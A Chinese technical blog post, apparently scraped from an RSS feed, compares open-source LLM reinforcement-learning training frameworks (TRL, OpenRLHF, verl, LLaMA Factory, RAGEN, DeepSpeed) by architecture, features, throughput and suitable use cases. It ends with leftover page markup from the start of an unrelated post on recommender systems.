.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>原文: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F9f4mqYVGKNS-LhmHLl6CXw" target="_blank" title="https://mp.weixin.qq.com/s/9f4mqYVGKNS-LhmHLl6CXw" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/9f4mqYVGK…</a></strong></p>
<p><strong>LLM-RL往期文章推荐</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fcx3qY42Lp0L3RaSOgsH77A" target="_blank" title="https://mp.weixin.qq.com/s/cx3qY42Lp0L3RaSOgsH77A" ref="nofollow noopener noreferrer">小白也能看懂的RL-PPO</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FnfN0dWT3ZfDuW7ZGfaG6dA" target="_blank" title="https://mp.weixin.qq.com/s/nfN0dWT3ZfDuW7ZGfaG6dA" ref="nofollow noopener noreferrer">收藏！强化学习从入门到封神：5 本经典教材 + 8 大实战项目 + 7个免费视频，一站式搞定</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F4_6CBXMJhqmiYKSzsAXncg" target="_blank" title="https://mp.weixin.qq.com/s/4_6CBXMJhqmiYKSzsAXncg" ref="nofollow noopener noreferrer">小白也能看懂的RLHF：基础篇</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F8O7W8--x14-b1d3M9IS_3w" target="_blank" title="https://mp.weixin.qq.com/s/8O7W8--x14-b1d3M9IS_3w" ref="nofollow noopener noreferrer">小白也能看懂的RLHF-PPO：原理篇</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F9KT9LrMTXDGHSvGFrQhRkg" target="_blank" title="https://mp.weixin.qq.com/s/9KT9LrMTXDGHSvGFrQhRkg" ref="nofollow noopener noreferrer">小白也能看懂的LLM-RL算法：PPO/DPO/GRPO/GSPO</a></p>
<p>2022年OpenAI发布Chatgpt之后，LLM成为了街头巷尾热议的话题。其中，LLM的训练和微调技术成为了这波技术浪潮的大功臣。在前面几篇中，我们详细介绍了LLM-RL训练、微调的核心算法原理。本篇将聚焦梳理LLM-RL开源 LLM-RL 训练框架。</p>
<p>在LLM-RL训练和微调技术演进中，模型对齐技术从辅助微调手段成为决定模型推理、安全与指令遵循能力的核心；SFT（Supervised Fine-Tuning）奠定模型基础行为，RLHF及其衍生的 RLVR（Reinforcement Learning with Verifiable Rewards）则成为突破模型能力上限的关键。</p>
<p>早期RLHF以OpenAI InstructGPT的PPO为核心，但该算法训练成本高，催生了2023年DPO等离线算法成为主流。2025年DeepSeek-R1等模型崛起后，在线采样和过程奖励模型相关的慢思考能力成竞争重点，倒逼社区革新LLM-RL训练框架。本报告将深度解构分析TRL、OpenRLHF、verl、LLaMA Factory四大主流开源LLM-RL训练框架，及 DeepSpeed等重要生态组件，围绕架构设计、关键特性、分布式计算策略及适用场景等维度展开，为相关从业者提供选型参考。</p>
<h2 data-id="heading-0">1 LLM-RL训练的挑战与架构演变</h2>
<p>为了更好的理解各大框架的设计理论，我们先简单剖析下LLM-RL训练中的挑战点。从往期的文章中可以看出，RLHF引入了复杂的环境交互过程：模型必须先根据当前的策略生成样本，并由奖励模型评分，最后通过梯度更新策略。这便带来以下两大挑战：</p>
<ul>
<li>
<p><strong>生成瓶颈与</strong> <strong>显存</strong> <strong>碎片化</strong>：在经典的RLHF流程中，经验数据生成耗时占训练周期 80%-90%的时间，而传统训练框架将生成与训练阶段耦合在同一计算流，会导致模式频繁切换，既造成显存碎片化，也生成阶段的推理效率极低即。即，在训练阶段时，需要维护庞大的梯度图和优化器状态，切换到生成模式时，又需要利用KV Cache来加速推理。</p>
</li>
<li>
<p><strong>四个模型协同的</strong> <strong>分布式</strong> <strong>难题</strong>：标准的PPO算法需要同时在显存中维护四个模型（Actor模型、Critic模型、Reward模型、Reference模型）。以训练一个70B的模型为例，仅仅加载这四个模型的权重就需要超过500GB的显存（FP16精度），这还没加上维护优化器状态和梯度值的存储显存，如何高效地在多GPU节点间切分这四个模型，成为了区分各框架架构优劣的关键因素。</p>
</li>
</ul>
<h3 data-id="heading-1">1.1 架构演进的三大流派</h3>
<p>针对上述挑战，开源社区演化出了三种主要的架构流派：</p>
<ul>
<li>
<p><strong>单体集成流派：</strong> 以<strong>TRL(Transformer</strong> <strong>Reinforcement Learning</strong> <strong>)</strong> 为代表，依托Hugging Face生态，强调算法的模块化和易用性，适合中小规模模型的科研探索。</p>
</li>
<li>
<p><strong>Ray</strong> <strong>分布式</strong> <strong>解耦</strong> <strong>流派：</strong> 以<strong>OpenRLHF</strong>为代表，利用Ray框架将Actor、Critic等模型物理分离到不同的GPU组，并引入vLLM作为独立的推理引擎，大幅提升生成效率，适合大规模模型的生产级训练。</p>
</li>
<li>
<p><strong>混合流引擎流派：</strong> 以<strong>verl</strong> <strong>(Volcano Engine</strong> <strong>RL</strong> <strong>)</strong> 为代表，通过极其灵活的3D-HybridEngine实现计算与数据的解耦，支持Megatron-LM等超大规模并行策略，面向万亿参数模型的极致优化。</p>
</li>
</ul>
<h2 data-id="heading-2">2 TRL</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fefe8bdde6743f388c4d0a4133f03de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUlGcm9udGllcnM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474243&amp;x-signature=pjchySsGHNxZD7YVPajZdYu3t44%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>github: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuggingface%2Ftrl" target="_blank" title="https://github.com/huggingface/trl" ref="nofollow noopener noreferrer">github.com/huggingface…</a> | 17k⭐</p>
</li>
<li>
<p>官方文档: <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fdocs%2Ftrl%2Findex" target="_blank" title="https://huggingface.co/docs/trl/index" ref="nofollow noopener noreferrer">huggingface.co/docs/trl/in…</a></p>
</li>
</ul>
<p>TRL不仅是一个代码库，更是Hugging Face生态在后训练阶段的官方实施标准，是生态系统的基石与标准化。它通过与transformers、accelerate和peft库的无缝集成，极大地降低了开发者进入RLHF领域的门槛。</p>
<h3 data-id="heading-3">2.1 核心架构：基于Trainer的模块化设计</h3>
<p>TRL的设计哲学是将强化学习过程封装为标准的Trainer类，继承自Transformers库的训练逻辑。这种设计使得熟悉SFT的用户可以几乎零成本地迁移到RLHF。</p>
<ul>
<li>
<p><strong>PPOTrainer 与 GRPOTrainer</strong>：TRL覆盖了经典PPO的PPOTrainer，v0.17.0+版本新增GRPOTrainer，GRPO通过生成输出组的相对归一化计算优势函数，去除Critic 模型、大幅降显存，是DeepSeek-R1等推理模型复现的首选算法。</p>
</li>
<li>
<p><strong>模型封装</strong>: TRL的AutoModelForCausalLMWithValueHead可以为任意因果语言模型动态加价值头，支持PPO价值估计，能直接对Llama 3、Mistral等模型做RL微调，适配灵活。</p>
</li>
</ul>
<h3 data-id="heading-4">2.2 关键特性</h3>
<ul>
<li>
<p><strong>算法全覆盖</strong>：TRL覆盖SFT、DPO、IPO、KTO、GRPO、BCO等主流后训练算法，是学术界新算法基准对比的首选框架。</p>
</li>
<li>
<p><strong>PEFT与量化集成</strong>：深度绑定peft和bitsandbytes，原生支持QLoRA，单张RTX 4090即可4-bit量化加载大模型并完成PPO、DPO微调，配置便捷。</p>
</li>
<li>
<p><strong>OpenEnv与Agent支持</strong>：集成OpenEnv实现模型与外部环境交互，顺应Agentic AI发展，从对齐工具演进为通用决策智能训练框架，支持工具调用与多步推理的强化学习。</p>
</li>
</ul>
<h3 data-id="heading-5">2.3 局限性与适用场景</h3>
<p>TRL易用性极佳，但大规模分布式训练效率不足</p>
<ul>
<li>
<p><strong>性能瓶颈</strong>：TRL默认用Hugging Face的generate ()生成样本，该方法未做系统级优化。在单体架构下，Actor与 Critic模型在同进程中通过accelerate进行调度，会带来显存的频繁换入换出和通信开销。</p>
</li>
<li>
<p><strong>适用场景</strong>：算法研究员、教育工作者以及算力受限（使用单机多卡或单卡）开发者的最佳选择，适合验证新 Reward函数、探索新Loss、小于30B模型上快速实验。</p>
</li>
</ul>
<h2 data-id="heading-6">3 OpenRLHF</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5eb1780773d45a6903344c5db7ba701~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUlGcm9udGllcnM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474243&amp;x-signature=5pvuSOm37i5XDGHksob789oWlDU%3D" alt="" loading="lazy"/></p>
<ul>
<li>gitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOpenRLHF%2FOpenRLHF" target="_blank" title="https://github.com/OpenRLHF/OpenRLHF" ref="nofollow noopener noreferrer">github.com/OpenRLHF/Op…</a> 8.8k⭐</li>
</ul>
<p>作为基于Ray与vLLM的分布式扩展架构，OpenRLHF是针对大规模生产环境设计的对齐框架，其核心设计出发点在于，RLHF的训练效率瓶颈在于生成阶段，且不同模型（Actor, Critic）对计算资源的需求截然不同。因此，OpenRLHF开启了大融合的的架构重构之路，核心为基于Ray的完全解耦。</p>
<h3 data-id="heading-7">3.1 架构革新：Ray+vLLM+DeepSpeed</h3>
<p>OpenRLHF基于Ray分布式框架，将PPO的四个模型物理拆分至不同GPU资源组，并引入专用推理引擎，核心优化体现在三方面：</p>
<ul>
<li>
<p><strong>调度</strong> <strong>解耦</strong>：支持用户灵活定义资源拓扑，可按任务将不同模型部署在独立GPU组，还能按需拆分/合并 Reward、Reference模型，彻底消除单体架构的短板效应。例如，训练一个70B模型训练时，可将Actor模型部署在8张A100上通过vLLM高速生成，Critic模型部署在另外4张A100进行价值评估，Reward和Reference模型可按需拆分或合并。</p>
</li>
<li>
<p><strong>推理加速</strong>：首个集成vLLM到RLHF训练循环的框架，借助PagedAttention和张量并行，让生成吞吐量数倍提升。同时，框架通过NCCL/CUDA IPC（进程间通信）实现Ray Actor间权重高效同步，保证训练与推理引擎参数一致；</p>
</li>
<li>
<p><strong>算法稳定性优化</strong>：集成优势归一化、梯度裁剪、分布式Adam Offload等验证有效的优化策略，解决 PPO 训练不稳定问题，保障千卡规模下的训练收敛性。</p>
</li>
</ul>
<h3 data-id="heading-8">3.2 关键特性与Agent范式</h3>
<ul>
<li><strong>Token-Level流水线：</strong> OpenRLHF采用「<strong>Token-in-Token-out</strong>」的设计范式。将单轮对话、多轮Agent交互均视为Token流处理，使其能够无缝支持复杂的Agent训练场景，确保训练时的文本分布与推理时完全一致，避免分布偏移问题。</li>
<li><strong>算法支持：</strong> 除了PPO，OpenRLHF还支持REINFORCE++、DAPO、RLOO等前沿算法，且支持条件PPO和拒绝采样，微调高推理能力模型时优势显著。</li>
</ul>
<h3 data-id="heading-9">3.3 性能优势与数据实证</h3>
<p>OpenRLHF在公开基准测试中性能优势显著，在GSM8K数据集GRPO的训练任务中，单Epoch仅需1657秒，相比于同等配置TRL的5189秒速度提升超3倍，这种效率提升源于vLLM高吞吐生成以及Ray异构模型调度的零开销切换。</p>
<p>对于70B+参数的超大模型，OpenRLHF是目前开源界少数能提供开箱即用全量微调方案的框架。</p>
<h2 data-id="heading-10">4 verl</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8020855e61a54666b4fbe8c6f4191a65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUlGcm9udGllcnM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474243&amp;x-signature=mSAcRS1gRoMBkd62HKX%2BwXiODLY%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>gitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvolcengine%2Fverl" target="_blank" title="https://github.com/volcengine/verl" ref="nofollow noopener noreferrer">github.com/volcengine/…</a> 18.5k⭐</p>
</li>
<li>
<p>官方文档: <a href="https://link.juejin.cn?target=https%3A%2F%2Fverl.readthedocs.io%2Fen%2Flatest%2F" target="_blank" title="https://verl.readthedocs.io/en/latest/" ref="nofollow noopener noreferrer">verl.readthedocs.io/en/latest/</a></p>
</li>
</ul>
<p>verl 是字节跳动（火山引擎）开源的 RLHF 框架，为 HybridFlow（<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2409.19256v2%25EF%25BC%2589%25E8%25AE%25BA%25E6%2596%2587%25E7%259A%2584%25E5%25B7%25A5%25E7%25A8%258B%25E5%25AE%259E%25E7%258E%25B0%25EF%25BC%258Cverl%25E4%25B8%25BB%25E8%25A6%2581%25E9%259D%25A2%25E5%2590%2591%25E4%25B8%2587%25E4%25BA%25BF%25E5%258F%2582%25E6%2595%25B0%25E6%25A8%25A1%25E5%259E%258B%25E4%25B8%258E%25E8%25B6%2585%25E5%25A4%25A7%25E8%25A7%2584%25E6%25A8%25A1%25E9%259B%2586%25E7%25BE%25A4%25E7%259A%2584%25E5%25B7%25A5%25E4%25B8%259A%25E7%25BA%25A7%25E9%259C%2580%25E6%25B1%2582%25E3%2580%2582" target="_blank" title="https://arxiv.org/pdf/2409.19256v2%EF%BC%89%E8%AE%BA%E6%96%87%E7%9A%84%E5%B7%A5%E7%A8%8B%E5%AE%9E%E7%8E%B0%EF%BC%8Cverl%E4%B8%BB%E8%A6%81%E9%9D%A2%E5%90%91%E4%B8%87%E4%BA%BF%E5%8F%82%E6%95%B0%E6%A8%A1%E5%9E%8B%E4%B8%8E%E8%B6%85%E5%A4%A7%E8%A7%84%E6%A8%A1%E9%9B%86%E7%BE%A4%E7%9A%84%E5%B7%A5%E4%B8%9A%E7%BA%A7%E9%9C%80%E6%B1%82%E3%80%82" ref="nofollow noopener noreferrer">arxiv.org/pdf/2409.19…</a></p>
<h3 data-id="heading-11">4.1 HybridFlow与3D-HybridEngine</h3>
<p>verl 的核心创新是编程模型与底层引擎深度协同，解决超大模型异构计算流的数据依赖问题。</p>
<ul>
<li><strong>3D-HybridEngine：</strong> 不同于OpenRLHF依赖Ray进行物理显存隔离，verl引入了3D-HybridEngine，该技术可在同组GPU上高效切换训练与生成状态，基于Megatron-LM并行切分策略实现Actor模型权重的显存原地复用或高效重分片，消除海量权重的网络传输开销、避免显存冗余占用。</li>
<li><strong>可编程数据流</strong>：verl提供了混合控制器功能，允许用户通过简单的Python代码定义复杂的RL数据流，解耦计算与数据依赖，灵活构建 PPO、GRPO/RLOO 等各类算法。</li>
</ul>
<h3 data-id="heading-12">4.2 Megatron-LM 生态与万亿模型支持</h3>
<p>verl的一个显著特征是深度支持<strong>Megatron-LM</strong>，对于100B+参数模型或MoE模型（如DeepSeek-V3 671B），单纯的DeepSpeed ZeRO策略往往由于通信瓶颈而难以扩展。verl集成了Megatron的张量并行（TP）、流水线并行（PP）和专家并行（EP），使其能够训练其它框架无法支持的超大模型。 此外，verl还具备以下特性：</p>
<ul>
<li><strong>后端多样性：</strong> 除了Megatron，verl也支持PyTorch FSDP和FSDP2，为Hugging Face模型用户提供了灵活性。</li>
<li><strong>推理集成：</strong> verl同样集成了vLLM和SGLang作为推理后端。其中，SGLang在结构化输出、长Context推理上性能优于vLLM，对推理类模型训练至关重要。</li>
</ul>
<h3 data-id="heading-13">4.3 性能优势</h3>
<p>verl兼具基础设施属性与算法创新价值，官方仓库提供 DeepSeek-R1-Zero/DeepSeek-R1 的完整复现方案，含 GRPO、GPG 算法实现。同时，开源了SOTA算法DAPO的代码，该算法在AIME 2024基准测试中表现优异。verl成为当前复现和研究推理大模型的首选框架。</p>
<h2 data-id="heading-14">5 LLaMA Factory</h2>
<ul>
<li>
<p>gitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhiyouga%2FLlamaFactory" target="_blank" title="https://github.com/hiyouga/LlamaFactory" ref="nofollow noopener noreferrer">github.com/hiyouga/Lla…</a> 66.1k⭐</p>
</li>
<li>
<p>官方文档: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.llamafactory.com.cn%2Fdocs%2Fdocuments%2Fintroduct" target="_blank" title="https://docs.llamafactory.com.cn/docs/documents/introduct" ref="nofollow noopener noreferrer">docs.llamafactory.com.cn/docs/docume…</a></p>
</li>
</ul>
<p>LLaMA-Factory Online 是一个面向科研机构、企业研发团队或个人开发者快速构建和部署AI应用的一站式大模型训练与微调平台，致力于提供简单易用、高效灵活的全流程解决方案。平台以“低门槛、高效率、强扩展”为核心，通过集成化工具链、可视化操作界面与自动化工作流，显著降低大模型定制与优化的技术成本，助力用户快速实现模型从开发调试到生产部署的全周期闭环，功能示意如下所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03e9834716e64cdaa57f6377dd28d49f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUlGcm9udGllcnM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769474243&amp;x-signature=q7qGReXXKI1cFgrCvVeGO6iN2iA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-15">5.1 统一接口与可视化训练</h3>
<p>LLaMA Factory最核心的贡献是提供了一个名为LLaMA Board的Web UI界面。用户无需编写一行代码，即可通过网页配置训练参数、选择数据集、监控训练进度并评估模型。</p>
<ul>
<li><strong>多模式支持：</strong> 框架底层封装了TRL、DeepSpeed和自定义的训练流程，用户可以通过下拉菜单在预训练（Pre-training）、指令监督微调（SFT）、DPO、PPO、KTO和ORPO之间无缝切换。</li>
<li><strong>低门槛适配：</strong> 对于不熟悉分布式系统的中小企业或个人开发者，LLaMA Factory屏蔽了accelerate config或deepspeed配置文件的复杂性，通过直观的表单驱动整个流程。</li>
</ul>
<h3 data-id="heading-16">5.2 Unsloth集成与效率优化</h3>
<p>LLaMA Factory非常敏锐地集成了社区中最高效的工具。</p>
<ul>
<li><strong>Unsloth加速：</strong> 它是首批集成<strong>Unsloth</strong>的框架之一。Unsloth通过手写Triton内核重写了Llama和Mistral模型的反向传播逻辑，使得LoRA微调速度提升了2倍，显存占用减少了50%以上。这使得在单张显卡上微调Llama3-70B成为可能。</li>
<li><strong>广泛的模型支持：</strong> 框架的维护者更新速度极快，几乎在Qwen、DeepSeek、Yi、Gemma等新模型发布的当天就能提供支持。</li>
</ul>
<h3 data-id="heading-17">5.3 局限性</h3>
<p>尽管在SFT和DPO领域表现出色，但在PPO等在线RL训练方面，LLaMA Factory的能力相对有限。它主要依赖单机多卡或简单的多机配置，缺乏OpenRLHF或verl那种复杂的Actor-Critic拆分调度能力，更适合基于LoRA的轻量级RLHF，而非从零开始训练基座模型的RL对齐。</p>
<h2 data-id="heading-18">6 垂直领域与高性能计算框架</h2>
<p>除了上述四大通用框架，还存在针对特定需求优化的LLM-RL解决方案。</p>
<h3 data-id="heading-19">6.1 RAGEN</h3>
<ul>
<li>gitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fragen-ai%2Fragen" target="_blank" title="https://github.com/ragen-ai/ragen" ref="nofollow noopener noreferrer">github.com/ragen-ai/ra…</a> 2.5k⭐</li>
<li>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fragen-doc.readthedocs.io%2Fen%2Flatest%2F" target="_blank" title="https://ragen-doc.readthedocs.io/en/latest/" ref="nofollow noopener noreferrer">ragen-doc.readthedocs.io/en/latest/</a></li>
</ul>
<p>RAGEN是基于verl构建的垂直框架，专门解决Agent在多步环境中的强化学习问题。</p>
<ul>
<li>
<p><strong>StarPO 算法：</strong> 针对多轮对话中常见的<strong>回声陷阱</strong>（即模型重复之前的错误）和梯度爆炸问题，RAGEN引入了StarPO算法，优化的是整个交互轨迹而非单个Token，使模型能够学会规划和工具使用。</p>
</li>
<li>
<p><strong>应用场景：</strong> 训练模型玩Sokoban游戏、解决复杂的逻辑谜题或执行多步API调用。</p>
</li>
</ul>
<h3 data-id="heading-20">6.2 DeepSpeed</h3>
<ul>
<li>
<p>gitHub: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdeepspeedai%2FDeepSpeed" target="_blank" title="https://github.com/deepspeedai/DeepSpeed" ref="nofollow noopener noreferrer">github.com/deepspeedai…</a> 41.3k⭐</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2FDeepSpeedExamples" target="_blank" title="https://github.com/microsoft/DeepSpeedExamples" ref="nofollow noopener noreferrer">github.com/microsoft/D…</a> 6.8k⭐</li>
</ul>
</li>
</ul>
<p>微软开源的LLM-RL优化框架，核心价值是「低成本高效训练/推理超大模型」，解决大模型显存不足、速度慢、成本高的核心痛点，是大模型落地主流框架。</p>
<p><strong>核心特性</strong></p>
<ul>
<li>
<p><strong>极致</strong> <strong>显存</strong> <strong>优化</strong>：以ZeRO系列优化器为核心，结合3D并行，显存占用降低5-10倍，支持千亿/万亿级参数量模型训练，推理侧ZeRO-Inference同步优化显存。</p>
</li>
<li>
<p><strong>高速高吞吐</strong>：算子级定制优化、混合精度训练、数据预处理加速，算力利用率达70%-90%，训练/推理速度远超原生PyTorch。</p>
</li>
<li>
<p><strong>全链路支持</strong>：覆盖预训练、SFT、RLHF、推理部署全流程，训练模型可直接部署，无技术断点。适配 Hugging Face Transformers、Megatron-LM 等主流生态，支持NVIDIA/AMD GPU、CPU等硬件。</p>
</li>
<li>
<p><strong>生产级特性</strong>：内置MoE模型支持、智能checkpoint管理、断点续训、量化推理等工业级功能。</p>
</li>
</ul>
<h2 data-id="heading-21">7 框架横向评测与选型指南</h2>
<p>为了帮助读者在众多框架中做出精准选择，我们将从性能、易用性和硬件需求三个维度进行横向对比。</p>
<h3 data-id="heading-22">7.1 吞吐量与性能对比</h3>
<p>根据公开的基准测试和社区反馈，各框架在吞吐量上的表现呈现明显的分层：</p>

































<table><thead><tr><th><strong>维度</strong></th><th><strong>OpenRLHF</strong></th><th><strong>verl</strong></th><th><strong>TRL</strong></th><th><strong>LLaMA Factory</strong></th></tr></thead><tbody><tr><td><strong>PPO</strong> <strong>/GRPO</strong> <strong>吞吐量</strong></td><td>极高 (vLLM加速)</td><td>极高 (vLLM/SGLang + HybridEngine)</td><td>中等 (原生Generate)</td><td>中等 (依赖后端)</td></tr><tr><td><strong>70B+模型支持</strong></td><td>原生支持 (Ray 分布式)</td><td>原生支持 (Megatron/FSDP)</td><td>困难 (需大量显存/量化)</td><td>仅限 LoRA/QLoRA</td></tr><tr><td><strong>通信开销</strong></td><td>中 (Ray跨节点通信)</td><td>低 (3D-HybridEngine原地复用)</td><td>高 (单体调度)</td><td>N/A</td></tr></tbody></table>
<ul>
<li><strong>verl vs OpenRLHF:</strong> 在使用FSDP后端时，verl与OpenRLHF性能差异不大，因为瓶颈都在vLLM推理上。但在超大规模（&gt;100B）且需要Megatron切分时，verl的架构更具优势，因为它避免了复杂的跨进程权重同步。</li>
</ul>
<h3 data-id="heading-23">7.2 选型建议</h3>
<ul>
<li>
<p><strong>算法研究员</strong>：</p>
<ul>
<li><strong>首选TRL</strong>：代码结构最清晰，文档最丰富，修改Loss函数或尝试新算法（如DPO改版）最容易。</li>
<li><strong>备选 LLaMA Factory</strong>：只是想快速验证SFT+DPO的效果，不需要写代码。</li>
</ul>
</li>
<li>
<p><strong>中小企业：</strong></p>
<ul>
<li><strong>OpenRLHF</strong>：性价比最高。能够利用Ray将散落在不同服务器上的消费级显卡（如4090）组合起来训练7B-34B模型，且性能优异。</li>
<li><strong>LLaMA Factory</strong>：如果团队缺乏深度开发能力，仅需对现有模型进行微调适配。</li>
</ul>
</li>
<li>
<p><strong>基础模型团队架构师</strong>：</p>
<ul>
<li><strong>verl</strong>：唯一能够原生支持万亿参数MoE模型全量RLHF的框架，与Megatron的结合是训练DeepSeek级别模型的必选项。</li>
</ul>
</li>
<li>
<p><strong>Agent应用开发者：</strong></p>
<ul>
<li>RAGEN或OpenRLHF： 需要对多轮对话轨迹进行整体优化，这两者提供了最好的Agent抽象。</li>
</ul>
</li>
</ul>
<p>随着RLVR的兴起，LLM-RL训练框架将不再仅仅是语言模型的优化器，演变为包含编译器、解释器和模拟器的复杂环境交互系统。框架竞争的焦点将从单纯的吞吐量转向环境交互效率、复杂推理轨迹的优化能力。对于开发者而言，掌握这些框架的原理与实践，将是应对这一AI浪潮的核心竞争力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用 Python 和 Jax 构建推荐系统(二) 数学考量]]></title>    <link>https://juejin.cn/post/7596943803933720616</link>    <guid>https://juejin.cn/post/7596943803933720616</guid>    <pubDate>2026-01-20T01:01:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596943803933720616" data-draft-id="7596905015367532544" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用 Python 和 Jax 构建推荐系统(二) 数学考量"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-20T01:01:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SimonSkywalker"/> <meta itemprop="url" content="https://juejin.cn/user/4153307917979129"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用 Python 和 Jax 构建推荐系统(二) 数学考量
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4153307917979129/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SimonSkywalker
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:01:20.000Z" title="Tue Jan 20 2026 01:01:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body 